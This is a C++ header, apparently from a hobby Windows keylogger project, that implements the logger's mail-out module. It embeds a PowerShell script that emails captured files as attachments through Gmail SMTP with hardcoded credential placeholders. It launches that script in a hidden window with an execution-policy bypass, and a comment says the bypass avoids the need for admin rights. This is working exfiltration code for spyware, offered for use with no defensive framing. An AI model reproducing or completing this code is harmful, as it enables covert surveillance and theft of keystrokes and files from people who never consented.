#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include "windows.h"

#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail
{
    //Sending to ourselves
    #define X_EM_TO "Mail address that receive"
    #define X_EM_FROM "Mail adress that send which exactly the same with above"
    #define X_EM_PASS "password of that mail address"

    const std::string &PowerShellScript =
"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    #undef X_EM_TO
    #undef X_EM_FROM
    #undef X_EM_PASS

    //what will be replaced in the s and replaced with "with"
    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
    {
        if(what.empty())
            return s;
        size_t sp = 0;

        while((sp = s.find(what,sp)) != std::string::npos)
            s.replace(sp, what.length(), with), sp+=with.length();
        return s;
    }

    bool CheckFileExists( const std::string &f)
    {
        std::ifstream file(f);
        return (bool)file;
    }

    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

        //created the path and see the if created
        if(!script)
            return false;
        script << PowerShellScript;

        //see the script work or not
        if(!script)
            return false;
        script.close();

        return true;
    }

    Timer m_timer;
    //Need to reuse again if the mail sending fails first time around

    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments )
    {
        bool ok;

        //create directory and checks it
        ok = IO::MkDir(IO::GetOurPath(true));
        if(!ok)
            return -1;//we will not able to create directory
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        //need to know the path to script and the script's name if there is chance to execute it
        if(!CheckFileExists(scr_path)) //if does not exist then create it
            ok = CreateScript(); // Multiple times keylogger starting problems
        if(!ok)
            return -2;

        /*Power Shell Scripts require admin privileges to execute a given script
        Execution policy bypass if you pass it to scripts beginning it, it will
        not require admin privileges,scripts run without any problem*/
        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                                + StringReplace(subject, "\"", "\\\"") +
                                 "\" -Body \""
                                 + StringReplace(body, "\"", "\\\"") +
                                  "\" -Att \"" + attachments + "\"";

        //Launch an external PS script , we will use shell execute ex function

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize =sizeof(SHELLEXECUTEINFO);
        //In order to prevent the powers shell terminate immediately
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        //Prevent to open a window
        ShExecInfo.hwnd = NULL; // keylogger doesn't have a window so it does not need this handle
        ShExecInfo.lpVerb = "open"//Right click and open
        ShExecInfo.lpFile = "powershell"; //this file will be executed with powershell
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL; //working directory which there is no need
        ShExecInfo.nShow = SW_HIDE;//ensures that the window is hidden
        ShExecInfo.hInstApp = NULL;//handle the instances

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        //Verify this can be executed
        if(!ok)
            return -3;//cannot
        //ShExecInfo is handle for our newly created process and we wait 7 seconds to
        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
        //Checking how the powershell working
        m_timer.SetFunction([&]()
        /* This is a lambda function(!!read on!!) using this to be able to
        access all the variables from the sendmail function*/
        {
             WaitForSingleObject(ShExecInfo.hProcess, 60000);
             GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
             if((int)exit_code == STILL_ACTIVE)
                TerminateProcess(ShExecInfo.hProcess, 100);
             Helper::WriteAppLog("<From SendMail> Return code:" + Helper::ToString((int)exit_code));

        });

        //even the function is finishes the timer still continue
        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }

    //We will overloading to send multiple attachments

    int SendMail(const std::string &subject, const std::string &body,
                  const std::vector<std::string> &att)
    {
        std::string attachments = "";
        if(att.size() == 1U)
            attachments = att.at(0);
        else
        {
            for(const auto &v : att)
                attachments += v + "::";
        attachments = attachments.substr(0, attachments.length() - 2);
        }
        return SendMail(subject, body, attachments);
    }

}

#endif // SENDMAIL_H
